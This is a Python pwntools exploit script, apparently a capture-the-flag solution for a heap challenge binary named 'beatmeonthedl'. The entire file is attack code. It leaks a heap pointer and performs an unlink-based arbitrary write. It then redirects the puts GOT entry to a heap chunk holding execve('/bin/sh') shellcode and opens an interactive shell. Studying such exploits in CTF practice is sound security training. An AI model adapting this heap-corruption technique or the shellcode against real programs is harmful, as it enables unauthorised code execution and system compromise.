#!/usr/bin/python
from pwn import *

reqlist = 0x609e80
puts_got = 0x609958

def login():
    print p.recvuntil(": ")
    p.sendline("mcfly")
    print p.recvuntil(": ")
    p.sendline("awesnap")
    print p.recvuntil("| ")

def alloc(payload):
    p.sendline("1")
    print p.recvuntil("> ")
    p.sendline(payload)
    print p.recvuntil("| ")

def print_req():
    p.sendline("2")
    data = p.recvuntil("| ")
    print data
    return data

def delete(idx):
    p.sendline("3")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil("| ")

def change(idx, payload, shell=False):
    p.sendline("4")
    print p.recvuntil(": ")
    p.sendline(str(idx))
    print p.recvuntil(": ")
    p.sendline(payload)
    if not shell:
        print p.recvuntil("| ")

def leak():
    #
    alloc("a"*15)
    alloc("b"*15)
    alloc("c"*15)
    alloc("d"*15)
    alloc("e"*15)
    #
    delete(1)
    delete(3)
    #
    payload = "c"*63
    change(2, payload)
    #
    data = print_req()
    addr = data[data.find("c"*63)+64:data.find("4)")-1]
    if len(addr) == 3:
        addr += "\x00"
    return u32(addr)


if __name__ == "__main__":
    p = process("./beatmeonthedl")

    login()

    p1_addr = leak()
    print 'p1 addr', hex(p1_addr)

    #unlink
    alloc("f"*15)
    alloc("g"*15)
    payload = p64(reqlist-0x18)
    payload += p64(reqlist-0x10)
    payload += p64(0x0)*4
    payload += p64(0x40)
    payload += p64(0x42)
    change(0, payload)
    delete(3)

    #write puts got to reqlist[0]
    payload = "A"*0x18
    payload += p64(puts_got)
    change(0, payload)


    #write shellcode to chunk5
    shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    change(4, shellcode)
    
    #write chunk5 addr to puts got
    p4_addr = p1_addr + 0xd0
    change(0, p64(p4_addr), True)

    p.interactive()
    p.close()

